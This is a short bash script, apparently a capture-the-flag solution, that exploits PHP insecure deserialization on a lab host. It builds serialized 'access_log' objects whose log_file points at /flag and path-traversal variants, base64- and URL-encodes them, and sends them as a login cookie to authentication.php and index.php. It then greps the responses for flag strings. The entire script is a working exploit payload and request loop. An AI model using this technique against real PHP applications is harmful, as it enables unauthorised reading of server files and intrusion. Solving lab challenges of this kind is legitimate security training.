#!/bin/bash
B="http://xebec.cylabacademy.net:38430"
# cookie : serialize(access_log("/flag")) puis base64 puis urlencode
for TARGET in "/flag" "../flag" "/flag.txt" "../flag.txt"; do
  PAYLOAD="O:10:\"access_log\":1:{s:8:\"log_file\";s:${#TARGET}:\"${TARGET}\";}"
  B64=$(printf '%s' "$PAYLOAD" | base64 -w0)
  ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$B64")
  echo "=== cible $TARGET ==="
  curl -s -m 20 -H "Cookie: login=$ENC" "$B/authentication.php" | grep -iE "academy\{|picoCTF\{|Welcome|Fatal|Warning" | head -5
done
echo "=== variante index.php ==="
PAYLOAD='O:10:"access_log":1:{s:8:"log_file";s:5:"/flag";}'
B64=$(printf '%s' "$PAYLOAD" | base64 -w0)
ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$B64")
curl -s -m 20 -H "Cookie: login=$ENC" -d "user=a&pass=b" "$B/index.php" | grep -iE "academy\{|Fatal|Warning|Welcome" | head -5
